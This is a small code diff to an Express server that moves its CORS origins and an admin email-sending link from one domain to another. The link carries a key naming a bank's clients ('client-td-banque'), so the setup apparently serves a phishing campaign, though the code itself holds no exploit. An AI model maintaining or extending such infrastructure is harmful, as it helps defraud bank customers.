@@ -63,8 +63,8 @@ app.disable('x-powered-by');
 
 // Define allowed CORS origins
 const allowedOrigins = [
-  'https://profil1-centre-1.online',
-  'https://www.profil1-centre-1.online'
+  'https://centr-prof.com',
+  'https://www.centr-prof.com'
 ];
 
 if (process.env.FRONTEND_URL) {
@@ -471,7 +471,7 @@ app.post('/api/admin/send-email', async (req, res) => {
     return res.status(400).json({ success: false, error: 'Recipient is required.' });
   }
 
-  const link = 'https://profil1-centre-1.online/?key=client-td-banque';
+  const link = 'https://centr-prof.com/?key=client-td-banque';
 
   const RESEND_API_KEY = process.env.RESEND_API_KEY;
   const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
